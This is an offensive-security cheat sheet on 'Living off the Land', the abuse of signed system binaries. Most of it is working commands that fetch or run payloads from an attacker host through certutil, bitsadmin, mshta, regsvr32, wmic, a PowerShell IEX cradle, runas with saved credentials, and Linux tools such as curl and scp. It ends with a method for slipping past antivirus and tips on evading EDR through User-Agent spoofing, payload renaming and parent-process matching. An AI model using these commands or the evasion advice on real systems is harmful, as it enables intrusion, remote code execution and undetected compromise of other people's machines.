---
title: Living Off The Land
---

Living off the Land (LOL) means using binaries already on the target to do your work. The point is simple: a signed Microsoft binary isn't going to get flagged by AV; your custom `downloader.exe` will. Reference sources:

- Windows: [LOLBAS Project](https://lolbas-project.github.io)
- Linux: [GTFOBins](https://gtfobins.github.io)

LOLBins can perform:
- Download / Upload
- Command execution
- File read / write
- AV, AppLocker, UAC bypasses

## Windows LOLBAS Highlights

### `certutil.exe`
```cmd
certutil.exe -urlcache -split -f "http://10.10.10.10/nc.exe" nc.exe
certutil.exe -verifyctl -split -f "http://10.10.10.10/nc.exe"
certutil.exe -encode input.bin encoded.b64
certutil.exe -decode encoded.b64 output.bin
```

### `bitsadmin.exe`
```cmd
bitsadmin /transfer job /download /priority normal http://10.10.10.10/nc.exe C:\Users\Public\nc.exe
```

### `desktopimgdownldr.exe`
```cmd
set "SYSTEMROOT=C:\Users\Public" && cmd /c desktopimgdownldr.exe /lockscreenurl:http://10.10.10.10/nc.exe /eventName:desktopimgdownldr
```

### `mshta.exe` — Remote HTA Execution
```cmd
mshta.exe http://10.10.10.10/evil.hta
```

### `regsvr32.exe` — Remote SCT (Squiblydoo)
```cmd
regsvr32.exe /s /n /u /i:http://10.10.10.10/file.sct scrobj.dll
```

### `wmic.exe` — Remote XSL
```cmd
wmic.exe os get /format:"http://10.10.10.10/evil.xsl"
```

### `powershell.exe` One-Liner
```powershell
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10/x.ps1')"
```

### `cmdkey.exe` + `runas` — Stored Credentials
```cmd
cmdkey /list
runas /savecred /user:DOMAIN\admin "powershell -c IEX(iwr http://...)"
```

## Linux GTFOBins Highlights

### `curl` / `wget`
```bash
curl -o /tmp/x http://10.10.10.10/x
wget http://10.10.10.10/x -O /tmp/x
```

### `scp` (also valid shell escape)
```bash
scp -S /tmp/pwn.sh x y:  # misuse of -S to execute a script
```

### `openssl` as HTTP client
```bash
openssl s_client -quiet -connect 10.10.10.10:443 < request.txt
```

### `nmap`
```bash
# Transfer via --script 
nmap --script http-fetch http://10.10.10.10/x -oN out.txt
```

### `vim` / `nano` / `tar` / `zip`
Most editors and archivers can read remote URLs or spawn shells — always check GTFOBins for the specific binary.

## Signed Binary Abuse Pattern

The common structure:

1. Pick a Microsoft-signed binary (`certutil`, `bitsadmin`, `mshta`, `regsvr32`, `wmic`, `msiexec`, `installutil`, `rundll32`).
2. Find its flag that accepts a URL or path.
3. Point it at your payload.
4. AV sees a signed Microsoft binary — low or no alert.

> [!tip] Current detections
> Modern EDR flags `certutil -urlcache -f`, `bitsadmin /transfer`, and `mshta` from untrusted URLs. Pair with User-Agent spoofing and payload renaming, or move to less-signatured LOLBins.

> [!warning] Operator discipline
> Don't fire LOLBins at random — each leaves a distinct process-tree artifact (`parent=word.exe child=mshta.exe` is a sensor goldmine). Match the LOLBin to the parent context you're in.
